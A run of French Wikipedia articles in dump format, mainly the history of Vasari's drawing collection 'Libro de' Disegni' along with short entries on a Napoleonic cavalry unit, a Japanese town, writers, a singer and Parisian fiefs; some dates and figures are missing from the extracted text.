En 1805, alors que le régiment d'infanterie légère reste en France, le régiment de cavalerie de la légion part pour l'Italie. Ses trois escadrons, incorporés à l'armée française de Naples en , y font le coup de sabre contre les bandes de partisans hostiles aux Impériaux. Les chevau-légers hanovriens quittent le pays en et, après un passage aux forces d'occupation en Prusse, rejoignent le théâtre de la guerre d'Espagne.
Arrivés sur place, ils sont affectés à la brigade de cavalerie légère du général Franceschi-Delonne, au sein du corps du maréchal Soult. Celui-ci est chargé de rattraper les troupes britanniques du général Moore en retraite, ce qui donne l'occasion aux chevau-légers de se mesurer aux hussards hanovriens de la King's German Legion. Au début de l'année 1809, la brigade Franceschi-Delonne avise un détachement espagnol de l'armée de La Romana et fait de nombreux prisonniers. Usée par le rythme des opérations, l'unité n'aligne plus que 17 officiers et 164 cavaliers à la fin du mois de janvier. Les Hanovriens chargent encore à la bataille de Braga le , perdant un officier tué et deux autres blessés. Vers la fin de l'année, l'arrivée de colonnes de renfort permet de remonter l'effectif à environ hommes organisés en quatre escadrons. Ainsi augmentés, les chevau-légers de la légion prennent part aux événements de la campagne du Portugal en 1810, ce qui occasionne une nouvelle fois des pertes importantes. Au mois d', l'Empereur ordonne la dissolution de l'unité et la répartition de ses ex-membres dans le et le chevau-légers lanciers.
Commandants.
Du à , la cavalerie de la légion hanovrienne est commandée par le colonel Charles Joseph Evers, ex-chef d'escadron du régiment de hussards. L'infanterie est dirigée en 1803 par le colonel Louis Cyriac Striffler puis, à partir de 1811, par le colonel Hohenzollern-Hechingen (?).

</doc>
<doc id="8728614" url="https://fr.wikipedia.org/wiki?curid=8728614" title="Kawanishi (Nara)">
Kawanishi (Nara)

 est un bourg du district de Shiki, dans la préfecture de Nara, au Japon.
Géographie.
Démographie.
Au , la population de Kawanishi s'élevait à répartis sur une superficie de .

</doc>
<doc id="8728620" url="https://fr.wikipedia.org/wiki?curid=8728620" title="Émile Hélitas">
Émile Hélitas

Émile Hélitas (né le à Chamboret, où il est mort le ) est un docteur en droit, préfet de la Charente-Inférieure en 1893, puis de la Loire-Inférieure en 1898. Son fils Maurice sera lui aussi préfet, du Cantal en 1910, puis du Calvados en 1917.
Un ensemble de souvenirs de ces deux hauts fonctionnaires a été proposé aux enchères le , Maîtres Beaussant Lefevre, Paris, Hôtel Drouot, salle 2.

</doc>
<doc id="8728624" url="https://fr.wikipedia.org/wiki?curid=8728624" title="Bob Demuyser">
Bob Demuyser



</doc>
<doc id="8728625" url="https://fr.wikipedia.org/wiki?curid=8728625" title="Karen Campbell">
Karen Campbell

Karen Campbell peut faire référence à :

</doc>
<doc id="8728630" url="https://fr.wikipedia.org/wiki?curid=8728630" title="Karen Campbell (écrivain britannique)">
Karen Campbell (écrivain britannique)

Karen Campbell, née en à Paisley, est une romancière écossaise.
Biographie.
Karen Campbell naît à Paisley, en Écosse, à une dizaine de kilomètres de Glasgow. Elle grandit à Glasgow. Son père et son mari sont tous deux policiers.
Titulaire d'une maîtrise universitaire en anglais et français obtenue en 1987 à l'université de Glasgow, elle travaille cinq ans dans les forces de police de Strathclyde. Elle s'inscrit ensuite à des cours postgrades de création littéraire.
Elle est mère de deux enfants.
Parcours littéraire.
Elle vient à l’écriture en 2008 avec le roman "The Twilight Time", traduit en français sous le titre "Trottoirs du crépuscule". Ces quatre premiers livres, centrés autour de la jeune policière Anna Cameron, appartiennent au genre de la procédure policière. Son style est influencé par celui des écrivains Ian Rankin et Kate Atkinson. 
Elle abandonne le genre policier après la parution du roman "This is Where I Am", l’histoire d’un immigré somalien débarquant à Glasgow.
Son septième roman, , est une histoire d'amour se déroulant en Italie pendant la Seconde guerre mondiale.
Son huitième roman, "Paper Cup", raconte l'histoire d'une SDF alcoolique qui entreprend un voyage rédempteur pour rendre une bague de fiançailles à son propriétaire.

</doc>
<doc id="8728636" url="https://fr.wikipedia.org/wiki?curid=8728636" title="Samarevac (Gradačac)">
Samarevac (Gradačac)

Samarevac (en serbe cyrillique : ) est un village de Bosnie-Herzégovine. Il est situé dans la municipalité de Gradačac, dans le canton de Tuzla et dans la fédération de Bosnie-et-Herzégovine. Selon les premiers résultats du recensement bosnien de 2013, il ne compte plus aucun habitant.
Avant la guerre de Bosnie-Herzégovine, le village faisait entièrement partie de la municipalité de Gradačac ; après la guerre, une portion de son territoire a été rattachée à la municipalité de Pelagićevo, intégrée à la république serbe de Bosnie.

</doc>
<doc id="8728638" url="https://fr.wikipedia.org/wiki?curid=8728638" title="Corson (chanteur)">
Corson (chanteur)

Alain Cordier, dit Corson (), né le à Thionville, est un auteur-compositeur-interprète français.
Biographie.
Formation et débuts.
Alain Cordier étudie dès l'âge de 8 ans le piano et le solfège au conservatoire de Thionville. Il se spécialise dans le chant lyrique à 17 ans tout en poursuivant des études de commerce international. En 1999, après le décès de sa mère, il quitte son emploi dans une banque du Luxembourg pour se consacrer à la musique.
En 2001, il intègre l'école de variétés d'Alice Dona et assure la première partie de celle-ci à l'Olympia et en tournée. En 2003, il participe à la comédie musicale "Belles belles belles" puis à la tournée asiatique de "Roméo et Juliette, de la haine à l'amour" de Gérard Presgurvic.
En 2009, le producteur Selim Mouhoubi lui propose de l'accompagner dans une carrière solo. Il prend le pseudonyme "Corson", que l'on prononce "Corsonne", en souvenir de sa mère et sort en 2011 un EP éponyme composé de 5 titres sous le label indépendant Selisam Productions.
En 2012, Corson signe sur le Label Mercury Records en France.
Albums "The Rainbow" et "Corson" (2014-2018).
En 2014, les singles "Raise me up" puis "Loud" sont programmés sur les ondes françaises. Sophie-Tith, gagnante de la "saison 9 de Nouvelle Star", l'invite en duo sur son titre "Ces choses-là". À l'automne 2014 sort l'EP intitulé "Loud", composé de 6 titres. Corson se produit en concert solo à Paris au Divan du Monde, au Café de la Danse, à La Cigale, et est également en première partie de Skip the Use, Boy George, Imagine Dragons, Lisa Stansfield, Laura Pausini, Morten Harket. Il est cette année-là le deuxième artiste français le plus diffusé en radio.
En 2015 sort l'album "The Rainbow", mixé et mastérisé entre autres par John Paterno (Robbie Williams) et Brad Blackwood (Maroon 5, Will I Am). Il part en tournée et fait la première partie de Calogero et du groupe A-ha le au Zénith de Paris.
En février 2016, son premier single "We'll come again" est synchronisé sur la Campagne mondiale du parfum "La Vie est Belle" de Lancôme (cosmétique) avec Julia Roberts. Le spot est réalisé par James Gray et durera 3 ans.
De 2016 à 2017, il sort trois singles : "Je respire comme tu mens", "La fille de Copenhague", "Nos amours embouties" extraits du deuxième album "Corson" (2018).
Collaborations (2018-2023).
Ensuite Corson se consacre à la composition et réalisation pour d'autres artistes comme David Hallyday, pour qui il écrit 3 textes pour son album en anglais "Mission Control". En 2018, il écrit, compose et co-réalise avec Boban Apostolov une grande partie de l'album de Jenifer, "Nouvelle Page" dont le premier single "Notre idylle" qui devient disque d'or.
Il co-écrit et compose également le single de la réédition de Jenifer, le titre "On oublie le reste" en duo avec Kylie Minogue. Le titre est produit par le DJ Bob Sinclar.
En 2018, Corson prête sa plume pour la nouvelle revue du Paradis latin, Oiseau Paradis, interprété par Miss Univers Iris Mittenaere mis en scène par Kamel Ouali. Il collabore avec le compositeur Brice Davoli. 
Il collabore aussi avec la chanteuse Yseult en 2019 sur son EP "Rouge" notamment sur son single "Rouge" avec qui il co-signe le texte.
En 2019, Corson écrit, compose et co-réalise avec Boban Apostolov une grande partie de l'album de Chimène Badi. Corson est co-auteur avec Yseult, Boban Apostalov et Yacine Azeggagh de la chanson "Là-Haut" défendue par Chimène Badi pour Destination Eurovision 2019.
En 2019, Corson écrit compose et co-réalise avec Boban Apostolov deux titres pour la réédition de l'album "Pyramide" de M. Pokora dont le titre "Mama" qui devient la BO de son premier film "Le Premier oublié" avec Muriel Robin, téléfilm qui réalise le plus gros score d'audiences de la saison pour une fiction sur TF1 avec plus de 6 millions de téléspectateurs.
En 2020, Corson participe à la composition du spectacle "Merci Francis" de Les Coquettes pour lesquelles il va écrire 2 chansons. Le spectacle se verra récompensé du Trophée des comédies musicales en 2022 dans la catégorie "Meilleure partition musicale".
En 2022, Corson réalise avec Boban Apostolov plusieurs titre de l'album "Madame" de l'artiste suisse Stéphane. Durant la même année, il participe au album studio de Jenifer "". En juin, Corson devient sociétaire définitif de la SACEM.
En 2023, Corson collabore avec les artistes Josiane, Nour, Olivier Dion, Jeanne Bonjour et Eloïz.
En 2023 également, son titre "Mon amour" écrit avec le compositeur Brice Davoli est synchronisé sur la bande annonce du film "Passages" de Ira Sachs avec Adèle Exarchopoulos.
Engagement.
Il est le parrain de l'association "Rafael Lorraine", au profit des enfants malades.

</doc>
<doc id="8728639" url="https://fr.wikipedia.org/wiki?curid=8728639" title="Simon Beckett">
Simon Beckett

Simon Beckett, né le à Sheffield, dans le Yorkshire du Sud, en Angleterre, est un journaliste, musicien et écrivain britannique. Il est notamment connu pour sa série de romans policiers consacrée à l’anthropologue judiciaire David Hunter.
Biographie.
Après l’obtention d’une maîtrise universitaire ès lettres en langue anglaise, il part en Espagne enseigner et jouer pour des troupes de théâtre itinérantes. De retour en Angleterre, il devient musicien, puis journaliste indépendant. Il a notamment travaillé pour le "Times", l’"Independent", le "Daily Telegraph" et l’"Observer".
Il commence une carrière de romancier en 1994 avec le roman "Fine Lines", traduit en français sous le titre "Le Rêve de l’antiquaire" par la maison d’édition Ramsay en 1996. 
Lors d’un reportage, il visite la ferme des corps de l’université du Tennessee, à Knoxville. Il s’inspire de cette expérience pour écrire le roman "Le Mort à nu" ("The Chemistry of Death", 2006), mettant en scène l’anthropologue judiciaire . Succès critique et commercial, ce roman fait de David Hunter un personnage récurrent de l’œuvre de Beckett.
En , il collabore avec le groupe britannique In the Nursery à la création d’un bande originale pour la série de quatre romans du héros David Hunter. Ce travail se retrouve sur l’album "The Calling" du groupe. Lors de la sortie le au Royaume-Uni du dernier roman de Beckett, "Stone Bruises", la bande-son est également signée par ITN.

</doc>
<doc id="8728640" url="https://fr.wikipedia.org/wiki?curid=8728640" title="Samarevac">
Samarevac

Samarevac peut désigner 2 localités de Bosnie-Herzégovine qui constituaient une seule et même entité avant la guerre de Bosnie-Herzégovine :

</doc>
<doc id="8728644" url="https://fr.wikipedia.org/wiki?curid=8728644" title="Liste de fiefs de Paris">
Liste de fiefs de Paris

Cette page recense les fiefs et immunités de Paris.
Le droit féodal était le cadre juridique de la ville de Paris du Moyen Âge jusqu'à son abolition à la Révolution.
Le territoire de la Ville était morcelé en fiefs ou censives, enchevêtrés et de tailles très diverses. La hiérarchie de « fiefs mouvants », « fiefs dépendants », et de « fiefs dominants » aux mains de seigneurs suzerains, la présence de plusieurs co-seigneurs détenteurs d'une même censive ajoutaient à cette complexité. &lt;br&gt;Les fiefs des seigneurs laïcs qui évoluaient en fonction des ventes, confiscations et partages successoraux ont perdu progressivement leur importance. Ceux appartenant à des institutions ecclésiastiques étant inaliénables étaient très stables. Outre le domaine royal, les censives les plus importantes étaient celles de l'évêque, du chapitre des chanoines de Notre-Dame, du chapitre de Sainte-Opportune et de plusieurs abbayes, Sainte-Geneviève, Saint-Germain-des-Prés, Saint-Martin-des-Champs, Temple.&lt;br&gt;
Quelques-uns parmi les plus importants disposaient de droit de justice (24 sur 155 censives en 1300).&lt;br&gt;
Il existait, par ailleurs, quelques alleux indépendants de toute emprise seigneuriale, ne représentant qu'une faible part du territoire.
Surface des principales seigneuries en % dans les limites de la ville en 1638 .
Cette liste ne comprend aucune censive laïque en dehors de celle du Roi.
S.
Ce territoire qui s'étendait sur une partie du cours préhistorique de la Seine était fréquemment inondé. Il fut drainé par le creusement de fossés d'écoulement, celui au nord formant limite du fief qui disparaitra avant le , celui au centre, limite sud du fief des environs de l'actuelle place de la République à l'actuel pont de l'Alma qui deviendra le grand égout recouvert à partir de 1760 et ceux de l'enceinte de Charles V plus au sud. Ce drainage permit la mise en culture des prairies à partir du : céréales puis jardins maraichers, vergers et vignes. Ce territoire ne fut urbanisé pour l'essentiel qu'au cours de la deuxième moitié du .

</doc>
<doc id="8728646" url="https://fr.wikipedia.org/wiki?curid=8728646" title="L'Homme de l'année (bande dessinée)">
L'Homme de l'année (bande dessinée)

"" est une série de bande dessinée française, débutée en et éditée par Delcourt, dans la collection « Histoire &amp; histoires ».
Synopsis.
Le thème de cette série est l'Histoire, au travers des inconnus, qui ont ou auraient pu exister. Ce projet conçu par Fred Blanchard cherche à couvrir différentes périodes historiques ; chacune abordée dans un album autour d'un personnage dont l'action va avoir des conséquences importances, mais dont le nom n'est pas connu du grand public aujourd'hui.
Albums.
Les couvertures de l’ensemble de la série sont l’œuvre de Manchu jusqu'au sixième tome, puis de Manchu et Fred Blanchard du septième au onzième tome, de Nicolas Siner à partir du douzième tome, et à nouveau de Manchu à partir du tome 17.

</doc>
<doc id="8728647" url="https://fr.wikipedia.org/wiki?curid=8728647" title="Prieuré de Saint-Marin">
Prieuré de Saint-Marin



</doc>
<doc id="8728654" url="https://fr.wikipedia.org/wiki?curid=8728654" title="Ahmad Mnajed">
Ahmad Mnajed

Ahmad Mnajed Abbas () (né le à Kirkouk en Irak) est un footballeur international irakien, qui évolue au poste d'attaquant.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il joue 37 matchs (pour 9 buts inscrits) entre 2001 et 2010. 
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2004 et de 2007. Il atteint les quarts de finale en 2004 et remporte l'édition en 2007.
Il participe également aux Jeux olympiques de 2004. Il joue deux matchs lors du tournoi olympique organisé en Grèce.
Il joue enfin quatre matchs comptant pour les éliminatoires des coupes du monde 2006 et 2010 et prend part à la Coupe du monde des moins de 20 ans 2001 organisée en Argentine.
Palmarès.
Avec l'Irak, il remporte la Coupe d'Asie des nations en 2007 en battant l'Arabie Saoudite en finale. 

</doc>
<doc id="8728661" url="https://fr.wikipedia.org/wiki?curid=8728661" title="Église Notre-Dame la Grande de Poitiers">
Église Notre-Dame la Grande de Poitiers



</doc>
<doc id="8728676" url="https://fr.wikipedia.org/wiki?curid=8728676" title="Castillejo">
Castillejo



</doc>
<doc id="8728684" url="https://fr.wikipedia.org/wiki?curid=8728684" title="CECLES">
CECLES



</doc>
<doc id="8728687" url="https://fr.wikipedia.org/wiki?curid=8728687" title="Libro de' Disegni">
Libro de' Disegni

Le Libro de' Disegni de Giorgio Vasari est une collection regroupant les dessins qu'il avait recueillis, aménagés et regroupés tout au long de la rédaction des "Vies des meilleurs peintres, sculpteurs et architectes".
Présentation.
Giorgio Vasari a écrit et publié deux éditions des "Vies des plus excellents peintres, sculpteurs et architectes". La première édition a été publiée en 1550 chez l'éditeur Torrentino. Elle est composée de trois parties présentant les trois âges de leur développement, précédées chacune d'un prologue particulier. Une préface générale précise les intentions de Vasari.
Dans la préface des "Vies", Giorgio Vasari explique pour quelles raisons il a entrepris de les écrire : 
Cette publication fait suite à la dispute sur la "Comparaison de la peinture et de la sculpture" qui avait été un sujet de discussion depuis la publication de "De pictura" de Leon Battista Alberti et la question posée par les humanistes de la Renaissance sur le caractère intellectuel des arts figuratifs et leur autonomie qui a été appelée débat du "Paragone". Dans le Traité de la peinture, Léonard de Vinci montre que l'application de la logique, des mathématiques et de la géométrie, l'anatomie et de l'optique fait de la peinture un art, considéré au Moyen Âge comme un art mécanique, pouvait être mis au même niveau que les arts libéraux. Cette discussion avait amené à la Renaissance à la redéfinition du mot artiste. Dans le livre "Le Livre du courtisan", Baldassare Castiglione discute de la peinture et la peinture et se montre en faveur de la supériorité de la peinture. Le philosophe florentin Benedetto Varchi, en 1546 (1547 après le déplacement du début de l'année au janvier) devant l"'Accademia fiorentina", discute du sujet après avoir fait une enquête auprès de Vasari, Bronzino, Pontormo, Giovanbattista del Tasso, Francesco de San Gallo, Tribolo, Cellini et Michel-Ange. Les deux leçons de Benedetto Varchi ont été publiées en 1549 par Torrentino. Page 101, il écrit : 
 Déjà, à la fin du , dans le `"Le Livre de la peinture", Cennino Cennini a écrit :
 Cette affirmation sur l'importance du dessin est déjà énoncé par Pétrarque dans le dialogue XLI, "De statuis", dans "De Remediis utriusque fortune Liber" (Contre la bonne et la mauvaise fortune) : 
Bien qu'aucun texte ne donne le but recherché par Vasari avec le "Vite", il reprend cette affirmation de Benedetto Varchi dans l'introduction de l'édition de 1550 des "Vite" : 
Le , le duc Cosme de Médicis, conseillé par Giorgio Vasari et Vincenzio Borghini, a fondé l’"Accademia et Compagnia dell'Arte del Disegno". Par la création de cette académie, Vasari a voulu élever le statut des artistes au-dessus de celui des corporations d'artisans.
L'affirmation de l'importance du dessin est encore plus forte dans l’"Introduction générale aux trois arts du dessin, c'est-à-dire, l'Architecture, la peinture et la sculpture", au chapitre XV, de la seconde édition des "Vite" Pour Vasari, le dessin a une faculté d'abstraction qui permet à l'intelligence de tirer des réalités dans leurs diversités l'idée générale enveloppant la pure connaissance de leurs qualités. Comme l'écrit Vasari, le dessin n'est autre que l'expression apparente et la manifestation du concept que l'on a dans l'esprit et de ce que l'on a imaginé et construit par la pensée.
Pour certains historiens d'art le recueil de dessins avait pour but d'illustrer "Les Vies des meilleurs peintres, sculpteurs et architectes" et de servir de rappel mnémotechnique de leurs œuvres. Pour d'autres, c'est un document autonome aux "Vite de'più eccelenti pittori, scultori e archittetori". Le livre de dessins n'est pas cité dans la première édition des "Vite", en 1550 et n'est cité que dans la seconde édition publiée en 1568 chez les Giunti, corrigée, augmentée d'une trentaine de biographies nouvelles, principalement ses contemporains, et ornée de portraits gravés sur bois. Dans la seconde version des "Vies", les occurrences de "designo" ont été multipliées par trois par rapport à la première et le "Libro de'disegno" sous la forme "nostro libro" est cité cent vingt-cinq fois.
Vasari a probablement cherché à illustrer les styles des différents artistes qu'il présente dans les Vies et montrer ce qu'il annonce dans les "Vies" en les divisant « en trois parties, appelons-les plutôt périodes, depuis la renaissance des arts jusqu'à notre siècle : chacune d'elles se distingue des autres par des différences manifestes ». Cette collection de dessins que Vasari cite dans la seconde édition des "Vies" est une histoire visuelle de l'art. Elle commence avec la vie de Cimabue à la fin de laquelle il écrit : Ces citations dans les "Vite" se poursuivent pour les cent vingt-cinq noms d'artistes cités et les quatre-vingt-dix-neuf biographies, jusqu'à son époque.
Vasari insiste dans les deux éditions des "Vite", de 1550 et 1568, sur l'importance des dessins comme documents permettant de percevoir la "maniera" des grands maîtres. Dans ses "Vite", Vasari indique qu'il possède un ou des dessins du maître dont il décrit la manière, comme à la fin de la Vie de Filippo Lippi : 
Dans la biographie de Lorenzo Ghiberti, il écrit qu'il a reçu de son petit-fils, Vettorio Ghiberti, en 1528, une collection de ses dessins. C'est probablement à cette date qu'il a commencé sa collection de dessins. Il est aussi probable qu'il n'a plus acquis de dessins après la parution de la seconde édition des "Vite", en 1568.
La collection de dessins de Giorgio Vasari.
Il est difficile de savoir combien de dessins étaient inclus dans le "Libro de' disegni". Il n'y a eu aucun inventaire des dessins après la mort de Vasari. Le seul document concernant le "Libro" est un "Ricordo" se trouvant dans le "Giornale et ricordi Vasari dal 1574 al 1686, segnato A" se trouvant dans les archives de la "Casa Vasari", à Arezzo. Deux jours après la mort de Vasari; le , son frère et ses neveux ont fait hommage du "Libro de' designi" au grand-duc Francesco qui avait exigé qu'il lui fût remis : .
Le "Ricordo" indique que les dessins sont montés sur des "fogli reali", des feuilles royales, qui correspondent à des feuilles de papier d'environ .
En l'absence d'inventaire des dessins de la collection Vasari, les chercheurs ont essayé de retracer cet inventaire à partir des descriptions de ces dessins faites par Vasari dans les "Vite". Par cette méthode, on ne peut arriver à identifier avec quelque certitude qu'une vingtaine de dessins. Les historiens ont fait remarquer qu'il y a des difficultés à faire correspondre les dessins qu'on suppose appartenir à la collection de Vasari avec les descriptions des "Vite" :
Certains historiens, comme Licia Ragghianti Collobri, ont émis l'hypothèse que la collection Vasari se trouvait dans plusieurs livres. André Chastel reprend cette hypothèse dans l'introduction du tome 12 de l'édition de "Les vies des meilleurs peintres, sculpteurs et architectes" avec une estimation la plus raisonnable d'un millier de feuilles réparties en huit à dix volumes. Mais cette hypothèse ne correspond pas au fait que Vasari et le "Ricordo" ne parlent que d'un seul livre.
Pierre-Jean Mariette a présente le "Libro de'disegni" dans une note du "Recueil de testes de caractère et de charges, dessinées par Léonard de Vinci, et gravées par M. le C. de C." (comte de Caylus), édition de 1730, page 19 note 1, indiquant que les dessins étaient rangés dans un grand volume d'environ deux pieds de haut sur dix-huit pouces de large (environ ), que toutes les feuilles étaient chargées de dessins au recto et au verso et pour une plus grande propreté étaient environnés de bordures dessinées avec soin par Vasari ou ses élèves. Mariette ayant eu ensuite accès à d'autres informations, en particulier les "Notizie de' professori del disegno da Cimabue in qua" de Filippo Baldinucci publiées en 1702 à titre posthume, il reprend dans la seconde édition de 1767 que le "Libro" était composé de cinq grands livres de dessins. Ce point de vue a été aussi exprimé dans le tome III de l’"Abecedario" de l'historien d'art Pierre-Jean Mariette, , note 1.
Pendant longtemps, les historiens de l'art ont associé les dessins de ce collectionneur passionné avec des encadrements dessinés à sa façon et pouvant rassembler plusieurs dessins d'un ou plusieurs peintres sur une même feuille qui ont été appelés le "montage Vasari".
Au total, on a répertorié aujourd'hui environ 526 dessins de son "Libro". Le cabinet des dessins du musée du Louvre possède 162 dessins du "Libro de' Disegni". Le Nationalmuseum de Stockholm possède dans son fonds 83 dessins du "Libro". Le "Gabinetto Disegni e Stampe" du musée des Offices de Florence en possède aussi un nombre important.
Dispersion de la collection.
En l'absence d'un inventaire des dessins du "Libro" fait par Vasari ou après de son décès, il est difficile d'être assurer de l'appartenance d'un dessin au "Libro" sauf lorsque Vasari en a fait une description précise dans les "Vite". Pierre-Jean Mariette a rattaché les dessins du "Libro" à la présence d'une bordure encadrant et mettant en valeur les dessins. Mais cette bordure n'est pas une garantie d'appartenance car d'autres collectionneurs ont aussi usé de ce procédé comme un autre important collectionneur florentin, le cavaliere Niccolò Gaddi (1537–1591). En 1950, les historiens de l'art Arthur Ewant Popham et Philip Pouncey ont montré dans le premier tome de l'inventaire des dessins italiens du British Museum que dans le montage du dessin d'une "Adoration de l’Enfant" attribuée au "Libro" se trouvaient l’"impresa" et la devise de la famille Gaddi (TANT CHE GIE VIVRAI - « Tant que je vivrai »). Pour eux, la bordure a été faite pour Niccolò Gaddi. D'autres dessins attribués au "Libro" ont été découverts avec l’"impresa" Gaddi. André Chastel a laissé la possibilité que ce ne soit qu'un ajout à une bordure du "Libro".
Sur la circulation des dessins du "Libro" après la mort de Vasari, il existe peu de documents :
La collection de Niccolò Gaddi, puis Arundel et Jabach.
Filippo Baldinucci indique dans ce texte que cinq grands livres de dessins provenant du "Libro de'Disegni" ont été vendus par les héritiers de Niccolò Gaddi, favori du grand-duc de Toscane, François de Médicis. Niccolò Gaddi était un des grands collectionneurs d'œuvres d'art qu'il gardait dans une maison qu'il avait fait aménager à Florence par l'architecte Giovannantonio Dosio, la "Casa dell'Orto". La collection Gaddi est connue par les inventaires de 1591 et de 1628. Niccolò Gaddi étant mort sans enfants, ses biens sont passés à son cousin Luigi, puis aux enfants de sa sœur Maddalena, mariée à Jacopo Pitti, qui doivent relever le nom de Gaddi. C'est son petit-neveu, Jacopo Pitti Gaddi, qui pressé de dettes a vendu une partie de la collection Gaddi. Cette vente est décrite dans une lettre de Rosso Antonio Martini, du : 
Cette vente correspond à l'achat à Florence, vers 1636-1637, d'une partie de la collection Gaddi par Thomas Howard, comte d'Arundel, alors ambassadeur en Allemagne, par l'intermédiaire de William Petty.
En 1668, dans une lettre à Colbert, Everhard Jabach écrit qu'il a été impressionné par les œuvres d'art qu'il avait vu en Angleterre. Jabach était allé en Angleterre pour se former aux affaires traitées par son père en 1636 et 1637. C'est donc probablement à cette période, quand la collection de dessins de Niccolò Gaddi achetée par le comte d'Arundel arrive dans son cabinet, qu'il a pu la voir. Il a aussi visité la collection du roi d'Angleterre, Charles. Il en profite pour faire peindre son portrait par Antoon van Dyck en 1637, aujourd'hui au Musée de l'Ermitage.
Le comte et la comtesse d'Arundel ont dû quitter l'Angleterre en 1642 pour s'établir sur le continent à la suite de la Première révolution anglaise. Lady Arundel a séjourné aux Pays-Bas tandis que le comte d'Arundel vivait à Padoue où il est mort en 1646. Pour payer des dettes, Lady Arundel a commencé à vendre une partie de la collection Arundel à partir du début 1650. Lady Arundel est morte à Amsterdam en 1654. William Howard, seul fils survivant, profitant d'un testament nuncupatif s'est approprié la collection, mais le litige sur cette succession a entraîné son partage et sa vente. C'est probablement à ce moment que Jabach a acheté les dessins ayant appartenu au comte d'Arundel. D'autres collectionneurs se sont portés acquéreur des dessins provenant de cette même collection. Mariette a écrit en 1767 que des vollumes contenant les dessins de cette collection sont arrivés en France entre les mains de l'abbé Quesnel qui les a vendus pièce par pièce. Par une lettre de Christian Huygens envoyée à son frère, en 1668, indique qu'un ensemble important de dessins provenant de la collection Arundel a été apporté de Flandres pour être proposé à la vente à Louis XIV. ont été acquises par le marchand d'art Samuel Gautier dont certaines passèrent ensuite à Christ Church (Oxford).
La collection de Pierre Crozat, puis de Pierre-Jean Mariette et de Carl Gustaf Tessin.
Pierre-Jean Mariette a écrit dans son "Abecedario", tome 2 : 
Pierre-Jean Mariette a établi le catalogue des dessins de la collection Crozat pour sa vente, en 1741. Il y indique que plusieurs dessins viennent du "Libro de' Disegni". Ces dessins ont été achetés par Mariette, par le comte Carl Gustaf Tessin, ambassadeur suédois auprès de la cour de Louis XV, et par le graveur et éditeur Gabriel Huquier. Après la vente de la collection Mariette, en 1775, ses dessins sont venus s'ajouter à ceux de Jabach dans la collection du roi, sauf un album essentiellement consacré à l'architecture qui a été acheté par Georges Séroux d'Agincourt qui se trouve depuis 1798 au Musée des Offices. Les dessins acquis par Carl Gustaf Tessin ont été achetés par le roi de Suède et se trouvent au Nationalmuseum depuis 1863.
Département des Arts graphiques du musée du Louvre.
Les premiers dessins appartenant au "Libro de' Disegni" de Giorgio Vasari sont entrés dans le Cabinet des dessins du roi Louis XIV avec l'achat de la collection Jabach, en 1671. Cette collection de dessins provenant de la collection Arundel achetée aux héritiers de Niccolò Gaddi provenait en partie du "Libro" et s'est enrichie ensuite d'autres pages avec l'achat d'une partie de la collection Mariette, en 1755, et de la saisie révolutionnaire de la collection Saint-Morys, en 1793.
Les pages du "Libro" se reconnaissent par leur bordure qui encadre un ou plusieurs dessins réunis sur la même feuille. Au les pages du "Libro" étaient dispersées dans les plus grandes collections européennes : Médicis, Arundel, Quesnel, Crozat et Mariette. Les dessins du "Libro" avaient d'abord été achetés par le collectionneur florentin Niccolò Gaddi (1537-1591) après la mort de Vasari, en 1574., vendus par ses héritiers avant le , date de la mort de Lorenzo Sabbatini chargé de les expertiser. Jabach a probablement acheté les dessins du "Libro" aux ventes de la collection de lord Arundel après sa mort, en 1646, et à sa veuve, en 1654.
Les pages venant de la collection peuvent provenir de la vente de la collection Crozat en 1741 dont il avait fait le catalogue. Une partie de la collection Mariette a été achetée en 1775 pour le cabinet du Roi.
D'autres pages sont venir enrichir le cabinet des dessins à la Révolution grâce aux saisies révolutionnaires des biens d'émigrés dont la plus importante est celle de Charles Paul Jean Baptiste de Bourgevin Vialart de Saint-Morys. Plusieurs pages sont entrées dans le cabinet des dessins grâce à des dons ou des achats.
Exposition au Louvre.
"Giorgo Vasari. Le Livre des dessins. Destinée d'une collection mythique", 31 mars au 18 juillet 2022, Rotonde Sully.&lt;br&gt;&lt;br&gt;
National Gallery of Art.
Une feuille recto-verso provenant du "Libro de' Disegno" acquise en 1991.
Albertina de Vienne.
Le fonds de la collection de dessins de l'Albertina de Vienne a été rassemblé par le duc Albert de Saxe-Teschen. Il commence sa collection de dessins en 1776, au moment où il se rend à Venise. Après la mort de Charles Alexandre de Lorraine en 1780, il est nommé gouverneur général des Pays-Bas autrichiens et réside au Palais royal de Bruxelles, aux châteaux de Marimont et de Scoonenberghe. La proximité des marchés de l'art de Londres, de Paris et des Pays-Bas lui permet de donner à sa collection une dimension importante. Il fait la connaissance du prince Charles Joseph Antoine Lamoral Ghislain de Ligne qui avait acheté des dessins aux ventes des collections de Pierre Crozat, de Pierre-Jean Mariette, de Charles Frédéric de la Tour du Pin Gouvernet en 1775, de Chabot en 1782 et de Julien de Parme, ainsi que chez le marchand Jean-Baptiste-Denis Lempereur (1726-1796) en 1779. Quelques années plus tard, il acquiert la collection de dessins réunis en Italie par Wilhelm Gottlieb Becker (1753-1813). Après la déclaration de guerre entre la France et l'Autriche en 1792, il se retire à Vienne. Il achète en 1794 la collection de dessins réunis par le prince Charles Joseph Antoine Lamoral Ghislain de Ligne, tué au combat de La Croix-aux-Bois, en septembre 1792. Il achète également la collection de Charles-Joseph de Ligne comprenant un ensemble important de dessins de Raphaël achetés à Crozat et Mariette et qui, elle, provenaient de la famille Antaldi, descendants de Timoteo Viti qui les avait reçus de Raphaël. Par testament, sa collection passe après sa mort le à son neveu, Charles-Louis d'Autriche-Teschen. La collection est réunie aux estampes de la Bibliothèque Impériale en 1919.
Musée national des beaux-arts de Stockholm.
Le musée national de Stockholm possède 83 dessins provenant de la collection de dessins rassemblés par Giorgio Vasari qui ont été acquis par le musée à travers les collections de Pierre Crozat et de Carl Gustaf Tessin.

</doc>
<doc id="8728690" url="https://fr.wikipedia.org/wiki?curid=8728690" title="Moïse et Aaron (film)">
Moïse et Aaron (film)

Moïse et Aaron ("Moses und Aron") est un film austro-germano-italo-français réalisé par Danièle Huillet et Jean-Marie Straub, sorti en 1975. Le film est dédié à Holger Meins.

</doc>
<doc id="8728699" url="https://fr.wikipedia.org/wiki?curid=8728699" title="Le Prix à payer (film, 2014)">
Le Prix à payer (film, 2014)

Le Prix à payer (titre original : "") est un film documentaire québécois réalisé par Harold Crooks, sorti en 2014. Il est inspiré du livre "La Crise fiscale qui vient", de la fiscaliste québécoise Brigitte Alepin.
Synopsis.
